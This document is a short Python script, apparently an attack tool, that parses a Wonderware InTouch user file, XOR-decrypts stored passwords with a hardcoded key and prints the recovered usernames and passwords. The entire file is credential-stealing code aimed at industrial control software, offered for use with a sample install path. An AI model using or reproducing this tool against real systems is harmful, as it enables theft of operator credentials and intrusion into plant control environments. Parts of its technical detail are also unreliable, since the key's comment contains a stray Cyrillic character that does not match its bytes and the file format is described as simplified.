#!/usr/bin/env python3
"""
Extract passwords from Wonderware InTouch configuration
Passwords stored in weakly encrypted format
"""

import os
import struct

def decrypt_intouch_password(encrypted_bytes):
    """
    InTouch uses simple XOR encryption for passwords
    Key is hardcoded in application
    """
    key = [0x45, 0x52, 0x54, 0x4E, 0x49, 0x52, 0x41, 0x44]  # "ERTNIRAД"

    decrypted = []
    for i, byte in enumerate(encrypted_bytes):
        decrypted.append(byte ^ key[i % len(key)])

    return bytes(decrypted).decode('utf-8', errors='ignore')

def extract_intouch_credentials(intouch_install_dir):
    """
    Extract usernames and passwords from InTouch configuration
    """
    # InTouch stores user credentials in .usr files
    usr_file = os.path.join(intouch_install_dir, "intouch.usr")

    if not os.path.exists(usr_file):
        print("[-] InTouch user file not found")
        return

    with open(usr_file, 'rb') as f:
        data = f.read()

    # Parse user records (simplified)
    offset = 0
    credentials = []

    while offset < len(data) - 32:
        # Check for username marker
        if data[offset:offset+4] == b'USER':
            username_len = struct.unpack('<H', data[offset+4:offset+6])[0]
            username = data[offset+6:offset+6+username_len].decode('utf-8', errors='ignore')

            # Password follows username
            pass_offset = offset + 6 + username_len
            if data[pass_offset:pass_offset+4] == b'PASS':
                pass_len = struct.unpack('<H', data[pass_offset+4:pass_offset+6])[0]
                encrypted_pass = data[pass_offset+6:pass_offset+6+pass_len]

                password = decrypt_intouch_password(encrypted_pass)
                credentials.append((username, password))

                print(f"[+] Username: {username}")
                print(f"    Password: {password}")

        offset += 1

    return credentials

# Usage
# extract_intouch_credentials("C:\\Program Files\\Wonderware\\InTouch\\")
